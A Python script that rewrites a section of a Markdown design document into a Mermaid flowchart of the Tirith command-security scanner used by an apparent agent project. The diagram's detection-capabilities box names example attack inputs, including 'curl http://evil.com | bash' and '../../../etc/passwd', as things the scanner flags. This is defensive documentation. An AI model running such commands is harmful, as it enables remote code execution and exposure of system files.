#!/usr/bin/env python3
"""修复 Tirith 安全扫描架构图"""

import glob
import re

# 找到文件
files = glob.glob('/home/meizu/Documents/my_agent_project/hermes-agent/Hermes-Agent*工具注册*.md')
filepath = files[0]

print(f"处理文件：{filepath}")

# 读取文件
with open(filepath, 'r', encoding='utf-8') as f:
    content = f.read()

# 匹配 ### 2.5 到下一个标题之间的内容
old_pattern = r'### 2\.5 Tirith 安全扫描架构\n\n```[\s\S]*?```\n\n## 3\. 核心业务流程'

new_content = '''### 2.5 Tirith 安全扫描架构

```mermaid
flowchart TD
    Start[Tirith 安全扫描] --> AutoInstall[自动安装机制]
    
    AutoInstall --> CheckPATH[检查 PATH 中的<br/>tirith 二进制]
    CheckPATH -->|未找到 | Download[后台线程下载<br/>GitHub Release]
    Download --> Verify[SHA-256 校验和 +<br/>cosign 签名验证]
    Verify --> Install[安装到<br/>$HERMES_HOME/bin/tirith]
    Install --> PersistFail[失败持久化:<br/>~/.hermes/.tirith-install-failed<br/>24h TTL]
    CheckPATH -->|已找到 | CheckCommand
    
    CheckCommand[check_command_security<br/>command]
    
    CheckCommand --> LoadConfig[加载配置]
    LoadConfig --> ConfigDetails["• tirith_enabled default: True<br/>• tirith_timeout default: 5s<br/>• tirith_fail_open default: True"]
    
    ConfigDetails --> ExecuteTirith[执行 tirith scan command]
    ExecuteTirith --> TimeoutCtrl[超时控制：5s<br/>可配置]
    TimeoutCtrl --> ParseJSON[解析 JSON 输出:<br/>findings + summary + action]
    
    ParseJSON --> ReturnResult[返回结果]
    ReturnResult --> ActionResult["• action: allow/warn/block<br/>• findings: [{severity, title,<br/>description, rule_id}...]<br/>• summary: 人类可读摘要"]
    
    ActionResult --> ErrorHandling[错误处理]
    ErrorHandling --> ErrorTypes["spawn 错误/超时/<br/>未知退出码"]
    ErrorTypes --> FailOpen{fail_open?}
    FailOpen -->|True| Allow[allow]
    FailOpen -->|False| Block[block]
    
    Allow --> Done[完成]
    Block --> Done
    Done --> Final[返回给调用者]
    
    subgraph Tirith 检测能力
        Homograph[Homograph URL 攻击<br/>西里文/希腊字母混淆]
        PipeInject[管道注入:<br/>curl http://evil.com | bash]
        TermInject[终端注入:<br/>ANSI 转义序列注入]
        SSHPhish[SSH 钓鱼:<br/>伪造主机密钥验证]
        CodeExec[代码执行:<br/>eval, exec, subprocess 注入]
        PathTraversal[文件路径遍历:<br/>../../../etc/passwd]
        CmdInject[命令注入:<br/>$, ``, ; cmd, | cmd]
    end
    
    ParseJSON -.-> Tirith 检测能力
    
    style Start fill:#90EE90
    style Final fill:#87CEEB
    style Allow fill:#90EE90
    style Block fill:#FFB6C1
    style Homograph fill:#FFE4B5
    style PipeInject fill:#FFE4B5
    style TermInject fill:#FFE4B5
    style SSHPhish fill:#FFE4B5
    style CodeExec fill:#FFE4B5
    style PathTraversal fill:#FFE4B5
    style CmdInject fill:#FFE4B5
```

## 3. 核心业务流程'''

# 执行替换
new_content_full = re.sub(old_pattern, new_content, content)

if new_content_full != content:
    print("✓ 成功替换 Tirith 安全扫描架构")
    # 写回文件
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(new_content_full)
    print(f"✓ 文件已更新：{filepath}")
else:
    print("✗ 替换失败，模式未匹配")
    # 调试
    match = re.search(r'### 2\.5 Tirith 安全扫描架构.*?## 3\. 核心业务流程', content, re.DOTALL)
    if match:
        print(f"找到匹配:\n{match.group()[:200]}...")
    else:
        print("未找到匹配的模式")
